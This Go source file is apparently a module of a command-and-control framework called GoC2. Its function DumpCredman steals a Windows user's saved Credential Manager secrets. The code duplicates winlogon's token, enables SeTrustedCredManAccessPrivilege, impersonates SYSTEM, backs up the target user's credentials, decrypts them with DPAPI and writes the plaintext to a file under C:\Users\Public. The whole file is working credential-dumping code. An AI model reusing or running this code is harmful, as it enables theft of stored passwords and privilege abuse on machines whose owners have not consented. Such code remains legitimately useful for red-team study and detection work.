package dumpcredman

import (
	"errors"
	"fmt"
	"log"
	"os"
	"strconv"
	"syscall"
	"unsafe"

	"github.com/latortuga71/GoC2/pkg/winapi"
	"golang.org/x/sys/windows"
)

func DumpCredman(userPid string) (string, error) {
	outFileEncrypted := "C:\\Users\\Public\\tempdpapi__.txt"
	outFileDecrypted := "C:\\Users\\Public\\tempDpapiDecryped.txt"
	userPidInt, err := strconv.Atoi(userPid)
	if err != nil {
		return "", err
	}
	winLogonPid := uint32(0)
	hSnapshot, err := windows.CreateToolhelp32Snapshot(windows.TH32CS_SNAPPROCESS, 0)
	if err != nil {
		return "", err
	}
	var pe32 windows.ProcessEntry32
	pe32.Size = uint32(unsafe.Sizeof(pe32))
	// do
	err = windows.Process32First(hSnapshot, &pe32)
	if err != nil {
		return "", err
	}
	// while
	for {
		err = windows.Process32Next(hSnapshot, &pe32)
		if err != nil {
			break
		}
		// else do stuff with process
		name := syscall.UTF16ToString(pe32.ExeFile[:])
		if name == "winlogon.exe" {
			winLogonPid = pe32.ProcessID
			break
		}
	}
	if winLogonPid == 0 {
		return "", errors.New("Failed to find winlogon process.")
	}
	windows.CloseHandle(hSnapshot)
	hProc, err := windows.OpenProcess(windows.PROCESS_QUERY_LIMITED_INFORMATION, false, winLogonPid)
	if err != nil {
		return "", err
	}
	log.Println("got past open winlogon process")
	var hToken windows.Token
	var duplicatedToken windows.Token
	err = windows.OpenProcessToken(hProc, windows.TOKEN_DUPLICATE, &hToken)
	if err != nil {
		windows.CloseHandle(windows.Handle(hProc))
		return "", err
	}
	log.Println("got past open winlogon process token")
	err = windows.DuplicateTokenEx(hToken, windows.TOKEN_ALL_ACCESS, nil, 2, windows.TokenPrimary, &duplicatedToken)
	if err != nil {
		windows.CloseHandle(windows.Handle(hToken))
		windows.CloseHandle(windows.Handle(hProc))
		return "", err
	}
	var luid windows.LUID
	err = windows.LookupPrivilegeValue(nil, syscall.StringToUTF16Ptr("SeTrustedCredManAccessPrivilege"), &luid)
	if err != nil {
		windows.CloseHandle(windows.Handle(hToken))
		windows.CloseHandle(windows.Handle(duplicatedToken))
		windows.CloseHandle(windows.Handle(hProc))
		return "", err
	}
	log.Println("got past lookup privilege")
	luAttr := windows.LUIDAndAttributes{
		Luid:       luid,
		Attributes: windows.SE_PRIVILEGE_ENABLED,
	}
	tp := windows.Tokenprivileges{
		PrivilegeCount: 1,
		Privileges:     [1]windows.LUIDAndAttributes{},
	}
	tp.Privileges[0] = luAttr
	oldTp := windows.Tokenprivileges{}
	var retLen uint32
	err = windows.AdjustTokenPrivileges(duplicatedToken, false, &tp, uint32(unsafe.Sizeof(tp)), &oldTp, &retLen)
	if err != nil {
		windows.CloseHandle(windows.Handle(hToken))
		windows.CloseHandle(windows.Handle(duplicatedToken))
		windows.CloseHandle(windows.Handle(hProc))
		return "", err
	}
	log.Println("got past adjust token")
	// get user token
	hUserProc, err := windows.OpenProcess(winapi.PROCESS_ALL_ACCESS, false, uint32(userPidInt))
	if err != nil {
		windows.CloseHandle(windows.Handle(hToken))
		windows.CloseHandle(windows.Handle(duplicatedToken))
		windows.CloseHandle(windows.Handle(hProc))
		return "", err
	}
	var hUserToken windows.Token
	err = windows.OpenProcessToken(hUserProc, windows.TOKEN_ALL_ACCESS, &hUserToken)
	if err != nil {
		windows.CloseHandle(windows.Handle(hUserProc))
		windows.CloseHandle(windows.Handle(hToken))
		windows.CloseHandle(windows.Handle(duplicatedToken))
		windows.CloseHandle(windows.Handle(hProc))
		return "", err
	}
	log.Println("got past user token and process")
	worked, err := winapi.ImpersonateLoggedOnUser(duplicatedToken)
	if !worked {
		windows.CloseHandle(windows.Handle(hUserToken))
		windows.CloseHandle(windows.Handle(hUserProc))
		windows.CloseHandle(windows.Handle(hToken))
		windows.CloseHandle(windows.Handle(hProc))
		return "", err
	}
	log.Println("got past impersonate system")
	// im system now
	err = winapi.CredBackupCredentials(windows.Handle(hUserToken), outFileEncrypted)
	if err != nil {
		windows.CloseHandle(windows.Handle(hUserToken))
		windows.CloseHandle(windows.Handle(hUserProc))
		windows.CloseHandle(windows.Handle(hToken))
		windows.CloseHandle(windows.Handle(duplicatedToken))
		windows.CloseHandle(windows.Handle(hProc))
		return "", err
	}
	log.Println("got past backyp")
	encryptedBlob, err := os.ReadFile(outFileEncrypted)
	if err != nil {
		os.Remove(outFileEncrypted)
		windows.CloseHandle(windows.Handle(hUserToken))
		windows.CloseHandle(windows.Handle(hUserProc))
		windows.CloseHandle(windows.Handle(hToken))
		windows.CloseHandle(windows.Handle(duplicatedToken))
		windows.CloseHandle(windows.Handle(hProc))
		return "", err
	}
	blob := windows.DataBlob{}
	blob.Size = uint32(len(encryptedBlob))
	blob.Data = &encryptedBlob[0]
	verify := windows.DataBlob{}
	err = windows.CryptUnprotectData(&blob, nil, nil, 0, nil, 0, &verify)
	if err != nil {
		os.Remove(outFileEncrypted)
		windows.CloseHandle(windows.Handle(hUserToken))
		windows.CloseHandle(windows.Handle(hUserProc))
		windows.CloseHandle(windows.Handle(hToken))
		windows.CloseHandle(windows.Handle(duplicatedToken))
		windows.CloseHandle(windows.Handle(hProc))
		return "", err
	}
	log.Println("got past crypt unprotect")
	windows.RevertToSelf()
	wrote := uint32(0)
	hFile := winapi.CreateFile(outFileDecrypted, windows.GENERIC_WRITE, 0, 0, syscall.CREATE_ALWAYS, syscall.FILE_ATTRIBUTE_NORMAL, 0)
	res := winapi.WriteFile(syscall.Handle(hFile), uintptr(unsafe.Pointer(verify.Data)), verify.Size, &wrote, 0)
	log.Println("got past write")
	if !res {
		os.Remove(outFileEncrypted)
		os.Remove(outFileDecrypted)
		windows.CloseHandle(windows.Handle(hFile))
		windows.CloseHandle(windows.Handle(hUserToken))
		windows.CloseHandle(windows.Handle(hUserProc))
		windows.CloseHandle(windows.Handle(hToken))
		windows.CloseHandle(windows.Handle(duplicatedToken))
		windows.CloseHandle(windows.Handle(hProc))
		return "", errors.New("Failed to write out file")
	}
	os.Remove(outFileEncrypted)
	windows.CloseHandle(windows.Handle(hFile))
	windows.CloseHandle(windows.Handle(hUserToken))
	windows.CloseHandle(windows.Handle(hUserProc))
	windows.CloseHandle(windows.Handle(hToken))
	windows.CloseHandle(windows.Handle(duplicatedToken))
	windows.CloseHandle(windows.Handle(hProc))
	//returnedCreds := *(*string)(unsafe.Pointer(&verify.Data))
	return fmt.Sprintf("[+] Dumped Credman wrote to %s", outFileDecrypted), nil
}
